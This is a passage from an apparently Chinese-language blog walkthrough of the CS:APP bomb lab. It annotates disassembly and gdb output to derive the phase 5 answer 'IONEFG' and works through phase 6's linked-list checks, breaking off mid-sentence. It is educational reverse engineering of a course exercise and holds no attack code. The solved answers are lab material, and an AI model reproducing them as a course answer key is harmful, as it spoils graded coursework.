data-num=\"24\"></td><td><pre>\t\t<span class=\"token comment\">//seg2 应该是个循环，其格式如下：</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\tecx <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>rbx <span class=\"token operator\">+</span> rax<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> 把<span class=\"token punctuation\">(</span>str<span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span>指向的<span class=\"token number\">4</span>个字节赋给ecx</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t\t<span class=\"token operator\">*</span>rsp <span class=\"token operator\">=</span> cl <span class=\"token operator\">-></span> rsp指向处存储ecx的最低一个字节</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\trdx <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>rsp <span class=\"token operator\">-></span> rdx <span class=\"token operator\">=</span> 最低的那个字节</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\tedx <span class=\"token operator\">=</span> edx <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf</span> <span class=\"token operator\">-></span> edx <span class=\"token operator\">=</span> 最低<span class=\"token number\">4</span>位</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\tedx <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>rdx <span class=\"token operator\">+</span> <span class=\"token number\">0x4024b0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> edx <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>最低四位 <span class=\"token operator\">+</span> <span class=\"token number\">0x4024b0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\t<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>rsp <span class=\"token operator\">+</span> rax <span class=\"token operator\">+</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> dl <span class=\"token operator\">-></span> rsp<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> edx的最低四位</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\trax <span class=\"token operator\">=</span> rax <span class=\"token operator\">+</span> <span class=\"token number\">0x1</span> <span class=\"token operator\">-></span> rax 递增</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>rax <span class=\"token operator\">!=</span> <span class=\"token number\">0x6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>rsp <span class=\"token operator\">+</span> <span class=\"token number\">22</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token operator\">-></span> rsp<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token comment\">// 字符串的末尾是 `\\0`</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\tesi <span class=\"token operator\">=</span> <span class=\"token number\">0x40245e</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\trdi <span class=\"token operator\">=</span> rsp <span class=\"token operator\">+</span> <span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\tcall strings_not_equal <span class=\"token comment\">// 判断 esi 处的字符串和 rsp + 16 处的 6 个字节的字符串是否相等</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>eax <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\t<span class=\"token comment\">// seg4</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t\trax <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>rsp <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// canary</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t\t<span class=\"token comment\">// compare rax and canary</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>rax <span class=\"token operator\">==</span> canary<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t\t\t<span class=\"token comment\">//seg5</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// release the stack</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">return</span> rax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t\t\tcall __stack_chk_fail</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t\tcall bomb_explode</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\tcall bomb_explode</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>0x40245e</code>  处的字符串如下：</p>\n<pre><code>(gdb) x/s 0x40245e\n0x40245e:       &quot;flyers&quot;\n</code></pre>\n<p>从上面的内容中我们可以看出：</p>\n<ol>\n<li>必须输入 6 个字符长度的字符串，否则炸弹爆炸</li>\n<li><code>rsp + 16</code>  处的字符串和 <code>0x40245e</code>  处的字符串 <code>flyers</code>  相同。</li>\n<li>我们需要计算一下 seg2 那段到底对字符串做了什么操作： <code>edx的值 = *(0x4024b0 + str[i]的最低4位)</code> ，然后 <code>str[i] = edx最低四位</code></li>\n<li>最后 <code>str</code>  需要等于 <code>flyers</code> ，也就是说 <code>*(0x4024b0 + str[i]的最低4位)的最低4位 = flyers</code></li>\n</ol>\n<p>其中 <code>flyers</code>  的编码为： <code>0x40245e:       0x66    0x6c    0x79    0x65    0x72    0x73    0x00</code> ，最后一个 <code>0x00</code>  在程序中手动设置了，所以无需自己设置。</p>\n<p>打印一下 <code>0x4024b0</code>  开始的字符串： <code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code></p>\n<p>因此，本题的目的是在 <code>0x4024b0</code>  开始的字符串中拼凑出 <code>flyers</code> ，然后把每个字符相对于开头的偏移量计算出来。其几个字符的地址分别是：</p>\n<ol>\n<li><code>f</code> :0x09</li>\n<li><code>l</code> :0x0f</li>\n<li><code>y</code> :0x0e</li>\n<li><code>ers</code> :0x05 0x06 0x07</li>\n</ol>\n<p>综合起来是： <code>0x09 0x0f 0x0e 0x05 0x06 0x07</code> 。我们来试一下 <code>*(0x4024b0 + str[i]的最低4位)</code>  是否等于 <code>flyers</code> 。测试出来是这样的。但是这 6 个字节不是字符，为了凑成字符，我们对每个数字加上 64（因为在计算的时候只取最低 4 位，所以对一个字节加上 64 不影响最后的偏移量），得到 <code>73, 79,78, 69, 70, 71</code>  (这里是 10 进制)，其对应的 ASCII 码是 <code>IONEFG</code> 。</p>\n<h2 id=\"phase6-分析-超级无敌杂糅嵌套多层循环\"><a class=\"markdownIt-Anchor\" href=\"#phase6-分析-超级无敌杂糅嵌套多层循环\">#</a> phase6 分析：超级无敌杂糅嵌套多层循环</h2>\n<p>phase_6 反汇编如下（哎哟我滴妈呀咋个这么长啊）：</p>\n<pre><code>00000000004010f4 &lt;phase_6&gt;:\nseg1:\n  4010f4:\t41 56                \tpush   %r14\n  4010f6:\t41 55                \tpush   %r13\n  4010f8:\t41 54                \tpush   %r12\n  4010fa:\t55                   \tpush   %rbp\n  4010fb:\t53                   \tpush   %rbx\n  4010fc:\t48 83 ec 50          \tsub    $0x50,%rsp\n  401100:\t49 89 e5             \tmov    %rsp,%r13\n  401103:\t48 89 e6             \tmov    %rsp,%rsi\n  401106:\te8 51 03 00 00       \tcallq  40145c &lt;read_six_numbers&gt;\n  40110b:\t49 89 e6             \tmov    %rsp,%r14\n  40110e:\t41 bc 00 00 00 00    \tmov    $0x0,%r12d\nseg2:\n  401114:\t4c 89 ed             \tmov    %r13,%rbp\n  401117:\t41 8b 45 00          \tmov    0x0(%r13),%eax\n  40111b:\t83 e8 01             \tsub    $0x1,%eax\n  40111e:\t83 f8 05             \tcmp    $0x5,%eax\n  401121:\t76 05                \tjbe    401128 &lt;phase_6+0x34&gt;\n  401123:\te8 12 03 00 00       \tcallq  40143a &lt;explode_bomb&gt;\nseg3:\n  401128:\t41 83 c4 01          \tadd    $0x1,%r12d\n  40112c:\t41 83 fc 06          \tcmp    $0x6,%r12d\n  401130:\t74 21                \tje     401153 &lt;phase_6+0x5f&gt;\n  401132:\t44 89 e3             \tmov    %r12d,%ebx\nseg4:\n  401135:\t48 63 c3             \tmovslq %ebx,%rax\n  401138:\t8b 04 84             \tmov    (%rsp,%rax,4),%eax\n  40113b:\t39 45 00             \tcmp    %eax,0x0(%rbp)\n  40113e:\t75 05                \tjne    401145 &lt;phase_6+0x51&gt;\n  401140:\te8 f5 02 00 00       \tcallq  40143a &lt;explode_bomb&gt;\nseg5:\n  401145:\t83 c3 01             \tadd    $0x1,%ebx\n  401148:\t83 fb 05             \tcmp    $0x5,%ebx\n  40114b:\t7e e8                \tjle    401135 &lt;phase_6+0x41&gt;\n  40114d:\t49 83 c5 04          \tadd    $0x4,%r13\n  401151:\teb c1                \tjmp    401114 &lt;phase_6+0x20&gt;\nseg6:\n  401153:\t48 8d 74 24 18       \tlea    0x18(%rsp),%rsi\n  401158:\t4c 89 f0             \tmov    %r14,%rax\n  40115b:\tb9 07 00 00 00       \tmov    $0x7,%ecx\nseg7:\n  401160:\t89 ca                \tmov    %ecx,%edx\n  401162:\t2b 10                \tsub    (%rax),%edx\n  401164:\t89 10                \tmov    %edx,(%rax)\n  401166:\t48 83 c0 04          \tadd    $0x4,%rax\n  40116a:\t48 39 f0             \tcmp    %rsi,%rax\n  40116d:\t75 f1                \tjne    401160 &lt;phase_6+0x6c&gt;\n  40116f:\tbe 00 00 00 00       \tmov    $0x0,%esi\n  401174:\teb 21                \tjmp    401197 &lt;phase_6+0xa3&gt;\nseg8:\n  401176:\t48 8b 52 08          \tmov    0x8(%rdx),%rdx\n  40117a:\t83 c0 01             \tadd    $0x1,%eax\n  40117d:\t39 c8                \tcmp    %ecx,%eax\n  40117f:\t75 f5                \tjne    401176 &lt;phase_6+0x82&gt;\n  401181:\teb 05                \tjmp    401188 &lt;phase_6+0x94&gt;\nseg9:\n  401183:\tba d0 32 60 00       \tmov    $0x6032d0,%edx\nseg10:\n  401188:\t48 89 54 74 20       \tmov    %rdx,0x20(%rsp,%rsi,2)\n  40118d:\t48 83 c6 04          \tadd    $0x4,%rsi\n  401191:\t48 83 fe 18          \tcmp    $0x18,%rsi\n  401195:\t74 14                \tje     4011ab &lt;phase_6+0xb7&gt;\nseg11:\n  401197:\t8b 0c 34             \tmov    (%rsp,%rsi,1),%ecx\n  40119a:\t83 f9 01             \tcmp    $0x1,%ecx\n  40119d:\t7e e4                \tjle    401183 &lt;phase_6+0x8f&gt;\n  40119f:\tb8 01 00 00 00       \tmov    $0x1,%eax\n  4011a4:\tba d0 32 60 00       \tmov    $0x6032d0,%edx\n  4011a9:\teb cb                \tjmp    401176 &lt;phase_6+0x82&gt;\nseg12:\n  4011ab:\t48 8b 5c 24 20       \tmov    0x20(%rsp),%rbx\n  4011b0:\t48 8d 44 24 28       \tlea    0x28(%rsp),%rax\n  4011b5:\t48 8d 74 24 50       \tlea    0x50(%rsp),%rsi\n  4011ba:\t48 89 d9             \tmov    %rbx,%rcx\nseg13:\n  4011bd:\t48 8b 10             \tmov    (%rax),%rdx\n  4011c0:\t48 89 51 08          \tmov    %rdx,0x8(%rcx)\n  4011c4:\t48 83 c0 08          \tadd    $0x8,%rax\n  4011c8:\t48 39 f0             \tcmp    %rsi,%rax\n  4011cb:\t74 05                \tje     4011d2 &lt;phase_6+0xde&gt;\n  4011cd:\t48 89 d1             \tmov    %rdx,%rcx\n  4011d0:\teb eb                \tjmp    4011bd &lt;phase_6+0xc9&gt;\nseg14:\n  4011d2:\t48 c7 42 08 00 00 00 \tmovq   $0x0,0x8(%rdx)\n  4011d9:\t00\n  4011da:\tbd 05 00 00 00       \tmov    $0x5,%ebp\nseg15:\n  4011df:\t48 8b 43 08          \tmov    0x8(%rbx),%rax\n  4011e3:\t8b 00                \tmov    (%rax),%eax\n  4011e5:\t39 03                \tcmp    %eax,(%rbx)\n  4011e7:\t7d 05                \tjge    4011ee &lt;phase_6+0xfa&gt;\n  4011e9:\te8 4c 02 00 00       \tcallq  40143a &lt;explode_bomb&gt;\nseg16:\n  4011ee:\t48 8b 5b 08          \tmov    0x8(%rbx),%rbx\n  4011f2:\t83 ed 01             \tsub    $0x1,%ebp\n  4011f5:\t75 e8                \tjne    4011df &lt;phase_6+0xeb&gt;\n  4011f7:\t48 83 c4 50          \tadd    $0x50,%rsp\n  4011fb:\t5b                   \tpop    %rbx\n  4011fc:\t5d                   \tpop    %rbp\n  4011fd:\t41 5c                \tpop    %r12\n  4011ff:\t41 5d                \tpop    %r13\n  401201:\t41 5e                \tpop    %r14\n  401203:\tc3                   \tretq   s\n</code></pre>\n<p>我们将其分为 16 个 seg，然后绘制一下函数流程图试试，总体过程如图</p>\n<p><img data-src=\"./phase6.png\" alt=\"图\">。</p>\n<p>然后，我们为了减小每步分析的工作量，根据跳转分支将其分为 6 个过程，如图</p>\n<p><img data-src=\"./segs.png\" alt=\"图\"></p>\n<p>下面我们对这 6 个过程来进行分析：</p>\n<h3 id=\"proc-1\"><a class=\"markdownIt-Anchor\" href=\"#proc-1\">#</a> Proc 1</h3>\n<p>首先进入的是 seg1，其做的工作是：</p>\n<ol>\n<li>压入 <code>r14 r13 r12 rbp rbx</code></li>\n<li>留出 80 个字节的空间</li>\n<li><code>r13 = rsp = rsi</code></li>\n<li>调用 <code>call_six_numbers</code> ，经前文分析， <code>read_six_numbers</code>  的传入参数为 <code>%rsi</code> ，返回值在 <code>%eax</code>  中，其存储了读入的数字的个数</li>\n<li><code>r14 = rsp = rsi = r13</code> ， <code>r12d = 0</code></li>\n</ol>\n<p>下面进入 seg 2，其做的工作是：</p>\n<ol>\n<li>让 <code>rbp = r13</code> ，那么现在 <code>r13 = r14 = rsi = rsp = rbp</code></li>\n<li>让 <code>eax = r13所指向的值</code></li>\n<li>判断 <code>eax - 1</code>  是否小于等于 5，如果 <code>eax - 1 &gt; 5</code> ，那么炸弹爆炸，也就是说 <code>eax</code>  必须小于等于 6</li>\n<li>正常情况下，进入 seg 3</li>\n</ol>\n<p>进入 seg 3 分析：</p>\n<ol>\n<li><code>r12d += 1</code></li>\n<li>将 <code>r12d</code>  与 6 比较，如果 <code>r12d ！= 6</code> ，那么 <code>ebx = r12d</code> ，随后进入 seg 4 (proc 2 中)</li>\n<li>否则就进入 seg 6 (proc 3 中)</li>\n</ol>\n<p>这里我们分析得到的结果是：</p>\n<ol>\n<li>seg 1 中进行了一些初始化的工作，让几个指针都指向输入数字的起始位置，并且让计数值 <code>r12d = 0</code></li>\n<li>seg 2 中让 <code>rbp 指向 r13所指向的位置</code>  (一开始 <code>r13 = r14 = rsp = rsi</code> ，因为后面还有进入 <code>seg 2</code>  的部分，所以不确定 <code>r13</code>  的指向会不会改变，先看看)，让 <code>eax = r13所指向的值</code> ，并且保证其必须小于等于 6</li>\n<li>seg 3 中让 <code>r12d</code>  计数值增加，判断 <code>r12d是否等于6</code> 。如果不等于 6，就让其等于 <code>ebx</code> ，然后进入 <code>seg 4</code> ；否则进 <code>seg 6</code> （看流程图可以看出，seg 6 离终点要更进一步，而 seg 4 在进入后做一些循环的工作后又会回到 seg 2，故我猜测这里 seg 4 以后的步骤是做了一些遍历的工作，但是在遍历的而过程中是读还是修改暂不清楚）</li>\n</ol>\n<h3 id=\"proc-2\"><a class=\"markdownIt-Anchor\" href=\"#proc-2\">#</a> Proc 2</h3>\n<p>接下来我们进入 seg 4：</p>\n<ol>\n<li>我们首先让 <code>rax = ebx</code>  (注意前面 <code>ebx = r12d</code> , 此时 <code>r12d</code>  已经递增到下一个位置了)，那么这里 <code>rax = ebx = r12d</code></li>\n<li>让 <code>eax = *(rsp + 4 * rax)</code> ，因为 rsp 是输入数字的起始位置，那么 rax 应该是一个索引，因为输入的是 <code>int</code>  类型，所以每次要  <code>* 4</code> 。假定输入的数字的字符串叫 <code>str</code> ，那么这里就是 <code>eax = str[rax]</code></li>\n<li>判断 <code>rbp 指向的值是否等于eax</code> ，前文中我们可以看到 <code>rbp</code>  指向的是 <code>r13</code>  所指向的位置，也就是让你判断 <code>r13</code>  指向位置的值是否等于 <code>eax</code> ，也就是前面的 <code>str[rax]</code></li>\n<li>如果不相等，进入 seg 5，否则炸弹爆炸 (下面那个图中的有点错误，菱锌框中应该是不相等)，我们可以初步判断，这里两个相邻的值应该是不能相等的（其他不相邻的能不能相等等会儿再看，如果 <code>r13</code>  改变的话，那么不相邻的值应该也不能像等）</li>\n</ol>\n<p>就接下来我们进入 seg 5：</p>\n<ol>\n<li><code>ebx += 1</code> （还记得 <code>ebx</code>  是什么吗？ <code>ebx = r12d</code> ！在前文中 <code>r12d</code>  已经向前跃进了一个位置，那么现在 <code>ebx</code>  还要比 <code>r12d</code>  再进一个位置）</li>\n<li>将 <code>ebx 和 0x5</code>  相比较，如果 <code>ebx &lt;= 0x5</code> ，也就是说如果之前的 <code>ebx &lt;= 0x6</code>  的话，继续回到 seg 4。否则 <code>r13 += 4</code> （ <code>r13</code>  果然改变了，向前跃进了 4 个字节，也就是一个 int 类型的大小），然后回到 seg 2</li>\n</ol>\n<p>这个过程我们分析得到的结果是：</p>\n<ol>\n<li>seg 4 让 <code>rax = ebx = r12d</code> ，然后让 <code>rax = str[rax]</code> ，判断 <code>rbp/r13</code>  指向的值是否等于 <code>eax</code> 。相等就爆炸，不相等就进 seg 5</li>\n<li>seg 5 判断之前的 <code>ebx</code>  是否小于等于 0x6， <code>r12d</code>  比 <code>ebx</code>  小 1。如果 <code>ebx &lt;= 0x6</code>  的话，回到 seg 4。seg 4 中还要判断下一个位置的数字和 <code>r13/rbp</code>  所指向的数字是否相等，相等就爆炸。否则 <code>r13</code>  指向下一个数字的位置，回到 seg 2。seg 2 中又要判断下一个数字是否小于等于 6，以及其和后面的数字是否相等。</li>\n</ol>\n<blockquote>\n<p>到这里我们可以初步判断，r13/rbp 是用于指向被比较的基准数，是指针。ebx/r12d 是用来递增的数组索引，是数字。获取到的数字通常被赋给 rax。输入的数字不能有相等的，也必须都小于等于 6。Proc 1 和 Proc 2 主要执行了一些检查的工作。</p>\n</blockquote>\n<h3 id=\"proc-3\"><a class=\"markdownIt-Anchor\" href=\"#proc-3\">#</a> Proc 3</h3>\n<blockquote>\n<p>从前文我们可以判断出，当进入 seg 6 的时候，r12d 肯定是等于 6 了，r13/rbp 也指向了最后一个数字。</p>\n</blockquote>\n<p>在 seg 6 中：</p>\n<ol>\n<li>我们让 <code>rsi</code>  指向最后一个数字的下一个位置，让 <code>rax = r14</code> , <code>ecx = 7</code> （ <code>r14</code>  一开始是指向 <code>rsp</code>  的，这两个值是什么含义这里还没有完全清楚）</li>\n</ol>\n<p>在 seg 7 中：</p>\n<ol>\n<li>我们让 <code>edx = ecx</code> （ <code>edx = ecx = 7</code> ）</li>\n<li><code>edx = edx - *rax</code> ，这里 <code>rax</code>  指向数组的开头，也就是让 <code>edx</code>  作为 7 和 <code>rax</code>  指向的当前值的差</li>\n<li><code>*rax = edx</code> ，也就是让 <code>rax</code>  指向的值 = 这个差</li>\n<li><code>rax</code>  指向下一个位置，比较 <code>rax</code>  和 <code>rsi</code> ，也就是判断是否到达了数组的末尾</li>\n<li>如果没有到达（ <code>rax</code>  还没有到达数组末尾 <code>rsi</code> ），就回到 seg 7，继续让每个数组的值 = 7 - 它的值</li>\n<li>否则  <code>esi = 0</code> ，跳到 <code>seg 11</code></li>\n</ol>\n<blockquote>\n<p>在这个子过程中，我们让每个数组的值都等于 7 - 它原本的值，遍历完成后 rax 指向数组末尾，r14 和 rsp 还在开头，esi = 0</p>\n</blockquote>\n<h3 id=\"proc-4\"><a class=\"markdownIt-Anchor\" href=\"#proc-4\">#</a> Proc 4</h3>\n<blockquote>\n<p>这个过程有点复杂，要慢慢来</p>\n</blockquote>\n<p>在 seg 11 中：</p>\n<ol>\n<li>我们让 <code>ecx的值 = *(rsp + rsi)</code></li>\n<li>将 <code>ecx</code>  和  <code>0x1</code>  比较，如果 <code>ecx &lt;= 0x1</code>  的话，跳转到 seg 9</li>\n<li>否则 eax = 1, edx =  <code>0x6032d0</code> ，跳转到 seg 8</li>\n</ol>\n<p>因为 seg 9 离终点更近，因此我们首先分析 seg 8，也就是 <code>7 - str[i] &gt; 1 -&gt; value &lt; 6</code>  的情况。</p>\n<ol>\n<li><code>rdx = *(rdx + 8)</code> ，也就是说 <code>rdx</code>  的值 = 离 <code>rdx</code> 8 个字节的位置的值 (大概率是个指针，因为需要解引，而且指针是 8 个字节对齐)</li>\n<li><code>eax += 1</code> ，将 <code>ecx</code>  和 <code>eax</code>  比较（这里 eax 已经从 2 开始了），如果 <code>eax</code>  还不等于 <code>ecx</code> ，那么回到 seg 8，否则到 seg 10</li>\n</ol>\n<p>seg 8 的含义为，从第一个差开始，如果当前这个差的值 &gt; 0x1 的话，一直寻找这个差的值的位置，保存在 <code>rdx</code>  中，并且这个差的值在 <code>rax</code>  中。</p>\n<p>同时我们来分析 seg 9，seg 9 中 <code>edx = 0x6032d0</code> ，直接进入 seg 10</p>\n<p>seg 10 的操作是：</p>\n<ol>\n<li><code>*(rsp + rsi * 2 + 32) = rdx</code> , 这里 rsi 的值 = 之前计算出的索引值（最开始是 0），rsp 的值 = 输入数字的位置</li>\n<li><code>rsi = rsi + 4</code></li>\n<li>将 <code>rsi</code>  和 24 比较，如果 <code>rsi != 24</code> ，即所有数字还没遍历完，退回到 seg 11</li>\n<li>否则进入 seg 12</li>\n</ol>\n<p>那么总结来说，这三个段的含义如下：</p>\n<ol>\n<li>seg 11 让 <code>ecx = str[rsi]</code> ，将其和 <code>0x1</code>  作比较</li>\n<li>当 <code>ecx &lt;= 0x1</code>  时，跳转到 seg 9，令 <code>edx = 0x6032d0</code> ，随后进入 seg 10</li>\n<li>当 <code>ecx &gt; 0x1</code>  时， <code>eax = 1, edx = 0x6032d0</code> ，跳转到 seg 8，seg 8 中从第一个值开始一直寻找第 <code>ecx</code>  个值的位置，并保存在 <code>rdx</code>  中，进入 seg 10</li>\n<li>seg 10 中我们把该数字的地址都存储在 <code>*(起始地址 + 2 * 索引 + 32)</code>  位置处，如果数字遍历完了，就进入 seg 12，否则就回退到 seg 11</li>\n</ol>\n<p>大概明白了，这里作者可能是想构建一个链表，他把链表的所有结点的起始地址放在一个数组里了！放置的顺序是我们输入的数字串的顺序！比如 <code>rsi = 0</code>  时，读入第 <code>ecx</code>  个数字，那么根据这个数字找到的 <code>edx</code>  就存储在地址数组的第一行。每个数字的地址都存储在 <code>起始地址 + 32 + 2 * 索引</code> 的位置。（为什么是这个还不太理解）</p>\n<p>到这里结束，6 个数字的位置分别存储的 <code>rsi</code>  是： <code>0 4 8 12 16 20 24</code> ，其偏移量是 <code>0 8 16 25 32 40 48</code> , 加上 32 后相距 <code>rsp</code>  的偏移量是： <code>32 40 48 57 72 80</code></p>\n<p>我们从 <code>0x6032d0</code>  开始，每次打印 16 个字节（小端序），前 8 个字节是数字的值，后 8 个字节是下一个结点的地址，其顺序如下：<br>\n第一个结点从 <code>0x6032d0</code>  开始：</p>\n<pre><code>(gdb) x/16xb 0x6032d0\n0x6032d0 &lt;node1&gt;:       0x4c    0x01    0x00    0x00    0x01    0x00    0x00    0x00\n0x6032d8 &lt;node1+8&gt;:     0xe0    0x32    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>那么第二个结点的地址应该是 <code>0x6032e0</code> ：</p>\n<pre><code>(gdb) x/16xb 0x6032e0\n0x6032e0 &lt;node2&gt;:       0xa8    0x00    0x00    0x00    0x02    0x00    0x00    0x00\n0x6032e8 &lt;node2+8&gt;:     0xf0    0x32    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>第三个结点的地址应该是 <code>0x6032f0</code> ：</p>\n<pre><code>(gdb) x/16xb 0x6032f0\n0x6032f0 &lt;node3&gt;:       0x9c    0x03    0x00    0x00    0x03    0x00    0x00    0x00\n0x6032f8 &lt;node3+8&gt;:     0x00    0x33    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>第四个结点的地址应该是 <code>0x603300</code> ：</p>\n<pre><code>(gdb) x/16xb 0x603300\n0x603300 &lt;node4&gt;:       0xb3    0x02    0x00    0x00    0x04    0x00    0x00    0x00\n0x603308 &lt;node4+8&gt;:     0x10    0x33    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>第五个结点的地址应该是 <code>0x603310</code> ：</p>\n<pre><code>0x603310 &lt;node5&gt;:       0xdd    0x01    0x00    0x00    0x05    0x00    0x00    0x00\n0x603318 &lt;node5+8&gt;:     0x20    0x33    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>第六个结点的地址应该是 <code>0x603320</code> ：</p>\n<pre><code>(gdb) x/16xb 0x603320\n0x603320 &lt;node6&gt;:       0xbb    0x01    0x00    0x00    0x06    0x00    0x00    0x00\n0x603328 &lt;node6+8&gt;:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<h3 id=\"proc-5\"><a class=\"markdownIt-Anchor\" href=\"#proc-5\">#</a> Proc 5</h3>\n<p>在这个子过程中，我们首先进入 seg12，经过一个看起来是循环的东西，再从 seg 14 出去。</p>\n<p>seg 12 的过程如下：</p>\n<ol>\n<li><code>rbx = *(rsp + 32)</code>  //rbx = 起始位置的值（链表第一个结点的地址）</li>\n<li><code>rax = rsp + 40</code>  // 第 2 个值（链表第二个结点的地址）的位置</li>\n<li><code>rsi = rsp + 80</code>  // 最后一个数（最后一个结点的地址）的位置</li>\n<li><code>rcx = rbx</code>  //rcx = rbx = 起始位置的值（第一个结点的地址）</li>\n</ol>\n<p>随后进入 seg 13，seg 13 的过程如下：</p>\n<ol>\n<li><code>rdx = *rax</code>  //rdx = rax 位置的值</li>\n<li><code>*(rcx + 8) = rdx</code>  //rcx 指向的下一个位置的值是 rdx</li>\n<li><code>rax += 8</code>  //rax = 下一个位置</li>\n<li>如果 rax == rsi，进入 seg 14，否则 <code>rcx = rdx</code> ，重新回到 seg 13</li>\n</ol>\n<blockquote>\n<p>这里把链表中的结点都串起来啦！</p>\n</blockquote>\n<p>seg 14 的过程如下：</p>\n<ol>\n<li><code>*(rdx + 8) = 0</code>  // 把链表最后一个节点的 next 域置为 0</li>\n<li><code>ebp = 5</code></li>\n</ol>\n<p>随后进入 seg 15。</p>\n<blockquote>\n<p>现在 rbx 的值等于链表第一个结点的地址，rcx 的值等于链表倒数第二个结点的地址，rdx 的值等于链表最后一个结点的地址，rsi 和 rax 指向链表的最后，ebp = 5</p>\n</blockquote>\n<h3 id=\"proc-6\"><a class=\"markdownIt-Anchor\" href=\"#proc-6\">#</a> Proc 6</h3>\n<p>seg 15 中完成了以下步骤：</p>\n<ol>\n<li><code>rax = *(rbx + 8)</code></li>\n<li><code>eax = *rax</code></li>\n<li>如果  <code>*rbx &gt;= eax</code> ，进入 seg 16</li>\n<li>否则炸弹爆炸</li>\n</ol>\n<p>这里说明第一个结点的值必须大于等于第二个结点，否则炸弹爆炸。</p>\n<p>seg 16 中执行以下步骤：</p>\n<ol>\n<li><code>rbx = *(rbx + 8)</code></li>\n<li>ebp -= 1</li>\n<li>如果 ebp != 0，进入 seg 15</li>\n<li>否则栈恢复</li>\n</ol>\n<p>这段说明链表的值从开始到后面必须严格递减。我们在前期已经获得了链表各个结点的值，我们只需要从大到小排列这些值即可，炸弹的密码是排列的顺序。这组值是 <code>0x014c 0x00a8 0x039c 0x02b3 0x01dd 0x01bb</code> ，翻译成十进制就是 <code>332 168 924 691 477 443</code>  (可以使用 <code>x/96dh 0x6032d0</code>  打印 <code>halfword</code> )，gdb 的 